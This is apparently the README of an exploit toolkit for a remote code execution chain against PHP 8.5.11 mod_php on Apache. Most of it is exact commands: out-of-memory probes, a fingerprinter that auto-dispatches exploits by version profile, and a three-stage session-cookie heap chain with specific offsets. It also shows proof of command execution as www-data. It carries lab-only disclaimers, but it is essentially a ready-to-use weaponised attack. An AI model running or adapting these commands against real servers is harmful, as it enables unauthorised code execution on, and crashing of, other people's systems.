# php2shell lab

Built by DeepSeek V4 Flash.

This is a lab-only setup for educational research against PHP 8.5.11 mod_php. The vulnerable module and configuration are intentionally unsafe.

Do not run this against systems you do not own or have explicit authorization to test. Keep the lab isolated and do not expose it to an untrusted network.

## Targets

- `bash lab/start-apache.sh` — urlencoded mode, no-filter build, port 18088.
- `bash lab/start-apache-filter.sh` — filter-enabled build, port 18089.
- `bash lab/start-apache-default.sh` — filter-enabled default-ish limits, port 18090.
- `bash lab/start-apache-session.sh` — session upload-progress target, 8M, port 18091.
- `sudo bash lab/start-php8511-docker.sh` — official PHP 8.5.11 Debian Docker target, port 18093; `--down` removes it.

Filter-enabled `$_FILES` bypass:

```bash
LAB_ASLR=1 bash lab/start-apache-filter.sh
pid=$(cat lab/httpd-filter.pid)
python3 exploit.py --port 18089 --multipart --auto-ar-data --pid "$pid"
```

Default-limit OOM probe:

```bash
bash lab/start-apache-default.sh
python3 probe_default.py --port 18090 --pressure 1000 --levels 60
```

The filter target uses `memory_limit=28M` in `lab/httpd-filter.conf`; the default target uses `memory_limit=128M` and `post_max_size=8M` in `lab/httpd-default.conf`. Recalibrate if the name length or body size changes.

## Fingerprinting and profiles

`fingerprint.py` identifies the PHP version, server/distro, SAPI hint, architecture
override and known build profile, then can dispatch the matching exploit.

```bash
# passive: headers, body hints, cookies, profile ranking
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64

# small upload-progress probe (authorized lab; no OOM)
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 --active

# one controlled OOM to discover memory_limit (kills/rotates a worker)
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 --oom-probe

# fingerprint -> profile -> exploit proof
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 \
    --oom-probe --run -c 'id>/out/p1' --proof-file /tmp/p2s-8511/out/p1
```

`--json` includes the fingerprint and ranked profiles. `--profile NAME` forces a
profile; `--list-profiles` prints the catalog. HTTP does not expose CPU
architecture, so remote auto-dispatch requires `--arch` when both architecture
profiles exist.

The profile catalog lives in `profiles/catalog.json`; individual
`profiles/*.json` files override catalog entries. It currently covers the public
8.5.11/8.5.10/8.4.26/8.4.25 verified images plus offsets-only and leak-only
entries for 8.3, 8.2, 8.1, 8.0 and 7.4. Only a profile with `rce: true` and all
stage parameters can be auto-run. See `profiles/README.md` for sources and the
exact status table.

The exploit target must be Apache prefork `mod_php` with one worker. This port
does not pin multiple prefork children; a known multi-worker target is marked
incompatible. The OOM probe and the chain are disruptive; use them only on an
authorized, disposable lab.

## Session chain

`session_exploit.py` ports the 9bie/Exploit-DB three-stage session chain (pre-RINIT OOM → `Set-Cookie` leaks → fake reference → `zif_system`).

Verified end-to-end against the official PHP 8.5.11 Docker target, twice consecutively:

```bash
sudo bash lab/start-php8511-docker.sh
python3 session_exploit.py \
    -u http://127.0.0.1:18093/index.php \
    -c 'id>/out/p1' --proof-file /tmp/p2s-8511/out/p1 \
    --poison big --huge-mb 12 --rotate \
    --zif-offset 0x5996e0 --dtor-offset 0x7b47a0 \
    --htdata-offset 0x690d8 \
    --stage1-n 841 --stage1-forge-len 63 \
    --stage2-t 406 --stage2-v 16 --carrier
```

Proof:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The Docker target must use `session.use_only_cookies=1` (the official default; the launcher now does). Stage 2 also needs the `f0000`/`x` 1001-field poison, and stage 3 needs the bookworm `Cookie: PHPSESSID=aaa...` header to keep `PS(id)` valid.

The heap geometry is build-specific. The custom minimal PHP 8.5.11 binary in this repo does not reproduce stage 1 with the official profile (it returns a normal 32-byte session cookie); use the official Docker target or calibrate a profile for that exact `libphp-nts.so`.

The official calibration probe/sweep is ported in `calibrate_session.py`:

```bash
bash lab/start-apache-session.sh
python3 calibrate_session.py -u http://127.0.0.1:18091/index.php \
    --proof-file /tmp/p --out profiles/php-8.5.11-local.json
```

On this minimal build it currently stops at stage 1: the `N=900`/forge-48 probe returns a normal 32-byte cookie with no `vNNNN` stale-block index. A profile for this exact binary is still required; the official 8.5.11 profile values do not transfer to it.
